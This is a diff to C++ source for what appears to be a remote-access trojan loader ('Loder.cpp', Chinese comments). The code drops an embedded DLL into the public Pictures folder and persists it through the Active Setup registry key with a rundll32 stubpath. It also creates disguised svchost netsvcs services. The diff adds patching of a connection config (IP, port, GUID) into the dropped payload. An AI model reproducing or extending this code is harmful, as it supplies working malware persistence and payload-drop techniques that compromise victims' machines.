@@ -1,13 +1,38 @@
 ﻿// Loder.cpp : 此文件包含 "main" 函数。程序执行将在此处开始并结束。
 //
-
+#include <afx.h>
 #include <iostream>
 #include <Windows.h>
 #include "resource.h"
 #include "RegEditEx.h"
 #include <shlobj.h> 
 
+
 #pragma comment(lib, "shell32.lib") 
+
+struct Connect_Address
+{
+	DWORD dwstact;
+	char  strIP[MAX_PATH];
+	int   nPort;
+	char  ActiveXKeyGuid[MAX_PATH];	// 查找创建的Guid
+}g_myAddress = { 0xCC28257,"",0,"" };
+
+
+
+int memfind(const char *mem, const char *str, int sizem, int sizes)
+{
+	int   da, i, j;
+	if (sizes == 0) da = strlen(str);
+	else da = sizes;
+	for (i = 0; i < sizem; i++)
+	{
+		for (j = 0; j < da; j++)
+			if (mem[i + j] != str[j])	break;
+		if (j == da) return i;
+	}
+	return -1;
+}
 
 bool CreateMyFile(const char* strFilePath, LPBYTE lpBuffer, DWORD dwSize)
 {
@@ -26,7 +51,7 @@ bool CreateMyFile(const char* strFilePath, LPBYTE lpBuffer, DWORD dwSize)
 	return true;
 }
 //要释放的路径   资源ID            资源名
-bool CreateEXE(const char* strFilePath, int nResourceID, const char* strResourceName)
+bool CreateEXE(const char* strFilePath, int nResourceID, const char* strResourceName,char* pActiveXKeyGuid = NULL)
 {
 	HRSRC hResInfo;
 	HGLOBAL hResData;
@@ -58,6 +83,20 @@ bool CreateEXE(const char* strFilePath, int nResourceID, const char* strResource
 	// 复制资源数据
 	CopyMemory((LPVOID)p, (LPCVOID)LockResource(hResData), dwSize);
 
+	// 设置guid
+	if (pActiveXKeyGuid != NULL)
+	{
+		g_myAddress.dwstact = g_myAddress.dwstact - 1;//不然内存中会有两个CC28256 我们只招一个
+		int nOffset = memfind((char*)p, (char*)&g_myAddress.dwstact, dwSize, sizeof(DWORD));
+		if (nOffset >= 0)
+		{
+			memcpy(&g_myAddress, p + nOffset, sizeof(Connect_Address));
+			strcpy(g_myAddress.ActiveXKeyGuid, pActiveXKeyGuid);
+			memcpy(p + nOffset, &g_myAddress, sizeof(Connect_Address));
+		}
+
+	}
+	
 	bool bRet = CreateMyFile(strFilePath, p, dwSize);
 	if (!bRet)
 	{
@@ -96,7 +135,7 @@ char *AddsvchostService()
 	char servicename[50];
 	do
 	{
-		//这里获得类似这样的服务名netsvcs_0，netsvcs_1。。。。。。。
+		//这里获得类似这样的服务名netsvcs_0，netsvcs_1
 		wsprintf(servicename, "netsvcs_0x%d", i);
 		for (ptr = buff; *ptr; ptr = strchr(ptr, 0) + 1)
 		{
@@ -237,6 +276,7 @@ int ServerSetup()
 
 
 
+
 BOOL GetNUM(char *num)
 {
 	CoInitialize(NULL);
@@ -266,6 +306,7 @@ void ActiveXSetup()
 	char ActivexStr[1024];                 // 用于存储ActiveX的键字串
 	char ActiveXKey[64];                   // ActiveX 的GUID字串
 	char strCmdLine[MAX_PATH];             // 存储启动的命令行参数
+	char fileName[MAX_PATH] = "cserver";                   // ActiveX 的GUID字串
 	
 	// ActiveX路径
 	char ActiveXPath[MAX_PATH] = "SOFTWARE\\Microsoft\\Active Setup\\Installed Components\\";
@@ -284,7 +325,7 @@ void ActiveXSetup()
 	//GetSystemDirectory(strFileName, MAX_PATH);
 	SHGetSpecialFolderPath(NULL, strFileName, CSIDL_COMMON_PICTURES, TRUE);
 	strcat(strFileName, "\\");
-	strcat(strFileName, ActiveXKey);
+	strcat(strFileName, fileName);
 	strcat(strFileName, ".dll");
 
 	
@@ -298,9 +339,9 @@ void ActiveXSetup()
 	sprintf(strCmdLine, "%s %s,FirstRun", "rundll32.exe", strFileName);
 	//将参数写道注册表中
 	RegSetValueEx(hKey, "stubpath", 0, REG_EXPAND_SZ, (BYTE *)strCmdLine, lstrlen(strCmdLine));
-	RegCloseKey(hKey);
+	//RegCloseKey(hKey);
 	//释放文件
-	CreateEXE(strFileName, IDR_DLL1, "DLL");
+	CreateEXE(strFileName, IDR_DLL1, "DLL", ActiveXKey);
 
 	//启动服务端
 	STARTUPINFO StartInfo;
